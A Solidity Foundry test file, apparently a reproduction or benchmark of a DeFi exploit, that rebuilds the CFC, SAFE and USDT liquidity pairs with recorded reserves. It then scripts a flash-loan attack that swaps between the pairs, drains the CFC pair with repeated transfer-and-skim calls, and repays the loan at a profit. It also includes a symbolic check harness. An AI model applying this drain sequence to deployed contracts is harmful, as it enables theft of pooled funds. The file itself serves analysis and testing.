// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "@utils/QueryBlockchain.sol";
import "forge-std/Test.sol";
import {AttackContract} from "./AttackContract.sol";
import {CFC} from "./CFC.sol";
import {SAFE} from "./SAFE.sol";
import {USDTCFC} from "./USDTCFC.sol";
import {USDT} from "@utils/USDT.sol";
import {UniswapV2Factory} from "@utils/UniswapV2Factory.sol";
import {UniswapV2Pair} from "@utils/UniswapV2Pair.sol";
import {UniswapV2Router} from "@utils/UniswapV2Router.sol";

contract CFCTestBase is Test, BlockLoader {
    USDT usdt;
    SAFE safe;
    CFC cfc;
    UniswapV2Pair safeusdtPair;
    UniswapV2Pair CakeLP;
    USDTCFC usdtcfc;
    UniswapV2Factory factory;
    UniswapV2Router router;
    AttackContract attackContract;
    address owner;
    address attacker;
    address usdtAddr;
    address safeAddr;
    address cfcAddr;
    address safeusdtPairAddr;
    address CakeLPAddr;
    address usdtcfcAddr;
    address factoryAddr;
    address routerAddr;
    address attackerAddr;
    uint256 blockTimestamp = 1686812805;
    uint112 reserve0safeusdtPair = 97465121886619415513006;
    uint112 reserve1safeusdtPair = 489503510554930476393732;
    uint32 blockTimestampLastsafeusdtPair = 1686812772;
    uint256 kLastsafeusdtPair = 47486313626300851357233065832927614284807383768;
    uint256 price0CumulativeLastsafeusdtPair =
        1289939749702297086941886408175762837312088370;
    uint256 price1CumulativeLastsafeusdtPair =
        19813834967984668036434544980989284471792;
    uint112 reserve0CakeLP = 3466655815335789642356;
    uint112 reserve1CakeLP = 100246518127533892079722;
    uint32 blockTimestampLastCakeLP = 1686812598;
    uint256 kLastCakeLP = 548155965428649915691831589164812341266909168;
    uint256 price0CumulativeLastCakeLP =
        210605282325395173002590957195716466715171;
    uint256 price1CumulativeLastCakeLP =
        272801197874040290279645040961546599365;
    uint256 totalSupplysafe = 931155431591721766722529;
    uint256 balanceOfsafesafeusdtPair = 97465121886619415513006;
    uint256 balanceOfsafeCakeLP = 3466655815335789642356;
    uint256 balanceOfsafeattacker = 0;
    uint256 totalSupplycfc = 3100000000000000000000000;
    uint256 balanceOfcfcsafeusdtPair = 0;
    uint256 balanceOfcfcCakeLP = 100246518127533892079722;
    uint256 balanceOfcfcattacker = 0;
    uint256 totalSupplyusdt = 3379997906401637314353418691;
    uint256 balanceOfusdtsafeusdtPair = 489503510554930476393732;
    uint256 balanceOfusdtCakeLP = 0;
    uint256 balanceOfusdtattacker = 0;

    function setUp() public {
        owner = address(this);
        usdt = new USDT();
        usdtAddr = address(usdt);
        safe = new SAFE();
        safeAddr = address(safe);
        cfc = new CFC(address(safe));
        cfcAddr = address(cfc);
        usdtcfc = new USDTCFC();
        usdtcfcAddr = address(usdtcfc);
        safeusdtPair = new UniswapV2Pair(
            address(safe),
            address(usdt),
            reserve0safeusdtPair,
            reserve1safeusdtPair,
            blockTimestampLastsafeusdtPair,
            kLastsafeusdtPair,
            price0CumulativeLastsafeusdtPair,
            price1CumulativeLastsafeusdtPair
        );
        safeusdtPairAddr = address(safeusdtPair);
        CakeLP = new UniswapV2Pair(
            address(safe),
            address(cfc),
            reserve0CakeLP,
            reserve1CakeLP,
            blockTimestampLastCakeLP,
            kLastCakeLP,
            price0CumulativeLastCakeLP,
            price1CumulativeLastCakeLP
        );
        CakeLPAddr = address(CakeLP);
        factory = new UniswapV2Factory(
            address(0xdead),
            address(safeusdtPair),
            address(CakeLP),
            address(0x0)
        );
        factoryAddr = address(factory);
        router = new UniswapV2Router(address(factory), address(0xdead));
        routerAddr = address(router);
        attackContract = new AttackContract();
        attackerAddr = address(attacker);
        attacker = address(attackContract);
        // Initialize balances and mock flashloan.
        usdt.transfer(address(safeusdtPair), balanceOfusdtsafeusdtPair);
        safe.transfer(address(safeusdtPair), balanceOfsafesafeusdtPair);
        safe.transfer(address(CakeLP), balanceOfsafeCakeLP);
        cfc.transfer(address(CakeLP), balanceOfcfcCakeLP);
        cfc.afterDeploy(address(router), address(CakeLP));
    }

    modifier eurus() {
        _;
    }

    function printBalance(string memory tips) public {
        emit log_string(tips);
        emit log_string("Usdt Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(usdt),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(safe),
            address(usdt),
            safe.decimals()
        );
        queryERC20BalanceDecimals(address(cfc), address(usdt), cfc.decimals());
        emit log_string("");
        emit log_string("Safe Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(safe),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(safe),
            address(safe),
            safe.decimals()
        );
        queryERC20BalanceDecimals(address(cfc), address(safe), cfc.decimals());
        emit log_string("");
        emit log_string("Cfc Balances: ");
        queryERC20BalanceDecimals(address(usdt), address(cfc), usdt.decimals());
        queryERC20BalanceDecimals(address(safe), address(cfc), safe.decimals());
        queryERC20BalanceDecimals(address(cfc), address(cfc), cfc.decimals());
        emit log_string("");
        emit log_string("Safeusdtpair Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(safeusdtPair),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(safe),
            address(safeusdtPair),
            safe.decimals()
        );
        queryERC20BalanceDecimals(
            address(cfc),
            address(safeusdtPair),
            cfc.decimals()
        );
        emit log_string("");
        emit log_string("Cakelp Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(CakeLP),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(safe),
            address(CakeLP),
            safe.decimals()
        );
        queryERC20BalanceDecimals(
            address(cfc),
            address(CakeLP),
            cfc.decimals()
        );
        emit log_string("");
        emit log_string("Usdtcfc Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(usdtcfc),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(safe),
            address(usdtcfc),
            safe.decimals()
        );
        queryERC20BalanceDecimals(
            address(cfc),
            address(usdtcfc),
            cfc.decimals()
        );
        emit log_string("");
        emit log_string("Attacker Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(attacker),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(safe),
            address(attacker),
            safe.decimals()
        );
        queryERC20BalanceDecimals(
            address(cfc),
            address(attacker),
            cfc.decimals()
        );
        emit log_string("");
        emit log_string("");
        emit log_string("");
    }

    function attackGoal() public view returns (bool) {
        return usdt.balanceOf(attacker) >= 1e18 + balanceOfusdtattacker;
    }

    function borrow_usdt_owner(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(owner);
        usdt.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_usdt_owner(uint256 amount) internal eurus {
        usdt.transfer(owner, amount);
    }

    function borrow_safe_owner(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(owner);
        safe.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_safe_owner(uint256 amount) internal eurus {
        safe.transfer(owner, amount);
    }

    function borrow_cfc_owner(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(owner);
        cfc.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_cfc_owner(uint256 amount) internal eurus {
        cfc.transfer(owner, amount);
    }

    function swap_safeusdtPair_attacker_safe_usdt(
        uint256 amount,
        uint256 amountOut
    ) internal eurus {
        safe.transfer(address(safeusdtPair), amount);
        safeusdtPair.swap(0, amountOut, attacker, new bytes(0));
    }

    function swap_safeusdtPair_attacker_usdt_safe(
        uint256 amount,
        uint256 amountOut
    ) internal eurus {
        usdt.transfer(address(safeusdtPair), amount);
        safeusdtPair.swap(amountOut, 0, attacker, new bytes(0));
    }

    function swap_CakeLP_attacker_safe_cfc(
        uint256 amount,
        uint256 amountOut
    ) internal eurus {
        safe.transfer(address(CakeLP), amount);
        CakeLP.swap(0, amountOut, attacker, new bytes(0));
    }

    function swap_CakeLP_attacker_cfc_safe(
        uint256 amount,
        uint256 amountOut
    ) internal eurus {
        cfc.transfer(address(CakeLP), amount);
        CakeLP.swap(amountOut, 0, attacker, new bytes(0));
    }

    function burn_cfc_CakeLP(uint256 amount) internal eurus {
        cfc.transfer(address(CakeLP), amount);
        CakeLP.skim(attacker);
        amount /= 15;
        cfc.transfer(address(CakeLP), amount);
        CakeLP.skim(attacker);
    }

    function swap_usdtcfc_attacker_usdt_cfc(
        uint256 amount,
        uint256 amountOut
    ) internal eurus {
        usdt.transfer(address(safeusdtPair), amount);
        safeusdtPair.swap(amountOut, 0, attacker, new bytes(0));
        uint256 amountOfSafe = safe.balanceOf(attacker);
        safe.transfer(address(CakeLP), safe.balanceOf(attacker));
        CakeLP.swap(
            1,
            CakeLP.getAmountOut(amountOfSafe, address(safe)),
            attacker,
            new bytes(0)
        );
    }

    function swap_usdtcfc_attacker_cfc_usdt(
        uint256 amount,
        uint256 amountOut
    ) internal eurus {
        cfc.transfer(address(CakeLP), amount);
        CakeLP.swap(amountOut, 0, attacker, new bytes(0));
        amountOut /= 3;
        cfc.transfer(address(CakeLP), amount);
        CakeLP.swap(amountOut, 0, attacker, new bytes(0));
        uint256 amountOfSafe = safe.balanceOf(attacker);
        safe.transfer(address(safeusdtPair), safe.balanceOf(attacker));
        safeusdtPair.swap(
            0,
            safeusdtPair.getAmountOut(amountOfSafe, address(safe)),
            attacker,
            new bytes(0)
        );
    }

    function test_gt() public {
        vm.startPrank(attacker);
        borrow_usdt_owner(57 * 1e22);
        printBalance("After step0 ");
        swap_usdtcfc_attacker_usdt_cfc(
            13 * 1e21,
            safeusdtPair.getAmountOut(13 * 1e21, address(usdt))
        );
        printBalance("After step1 ");
        burn_cfc_CakeLP((cfc.balanceOf(address(attacker)) * 15) / 16);
        printBalance("After step2 ");
        burn_cfc_CakeLP(cfc.balanceOf(address(CakeLP)) - 1);
        printBalance("After step3 ");
        swap_usdtcfc_attacker_cfc_usdt(
            cfc.balanceOf(attacker) / 200,
            CakeLP.getAmountOut(cfc.balanceOf(attacker) / 200, address(cfc))
        );
        printBalance("After step4 ");
        payback_usdt_owner(57 * 1e22);
        printBalance("After step5 ");
        require(attackGoal(), "Attack failed!");
        vm.stopPrank();
    }

    function check_gt(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt7 >= amt0);
        borrow_usdt_owner(amt0);
        swap_usdtcfc_attacker_usdt_cfc(amt1, amt2);
        burn_cfc_CakeLP(amt3);
        burn_cfc_CakeLP(amt4);
        swap_usdtcfc_attacker_cfc_usdt(amt5, amt6);
        payback_usdt_owner(amt7);
        assert(!attackGoal());
        vm.stopPrank();
    }
}
